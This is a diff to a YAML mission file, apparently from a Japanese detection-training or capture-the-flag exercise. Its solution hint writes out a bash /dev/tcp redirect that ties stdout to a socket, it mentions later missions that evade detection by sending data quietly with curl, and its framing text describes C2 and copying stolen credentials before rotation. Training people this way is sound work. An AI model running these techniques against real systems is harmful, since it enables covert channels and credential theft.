@@ -16,7 +16,10 @@ steps:
     detail: |
       alpine の bash は /dev/tcp/<host>/<port> という疑似デバイスを built-in で持つ。
       これで TCP socket を開き、fd リダイレクトで標準入出力に繋いでみよう。
-      接続が成立する宛先が要る (例えば TCP 53 を受け付けるパブリック DNS サーバなど)。
+      このワークスペースは egress lockdown 済みなので、接続先は collector/DNS/
+      API server 以外だと繋がらず (silently drop → connect がハングし dup2 に
+      到達しない = 発火しない)。常に許可されている自分の DNS リゾルバ
+      (/etc/resolv.conf の nameserver、TCP 53 も受け付ける) を宛先にする。
   - label: スコアボードで CLEARED を確認
     detail: 発火が scoreboard に届くと、このミッションが自動で CLEARED になる。
 hints:
@@ -34,7 +37,7 @@ hints:
       送信系のコマンド例はコマンド集『5. ネットワーク / 送信』にまとめてある。
     cheatsheetRef: "5"
   - kind: solution
-    text: "想定解: bash -c 'exec 1<>/dev/tcp/8.8.8.8/53' — <> が socket fd を stdout に dup する瞬間に発火。この先の回避ミッションでは逆に dup を避け curl で静かに送る。"
+    text: "想定解: DNS=$(awk '/^nameserver/{print $2; exit}' /etc/resolv.conf) && bash -c \"exec 1<>/dev/tcp/$DNS/53\" — egress lockdown 環境では宛先を必ず許可済みの DNS リゾルバにする (8.8.8.8 等の外部宛先は接続が drop され dup2 に到達しない)。<> が socket fd を stdout に dup する瞬間に発火。この先の回避ミッションでは逆に dup を避け curl で静かに送る。"
 bridge: >-
   C2 は開通した。あとは戦利品を運び出すだけ — だが運用側が credential を rotate すれば
   盗んだ鍵は無効になる。rotate されても中身が残る自分用のコピーを、先に確保しておく。
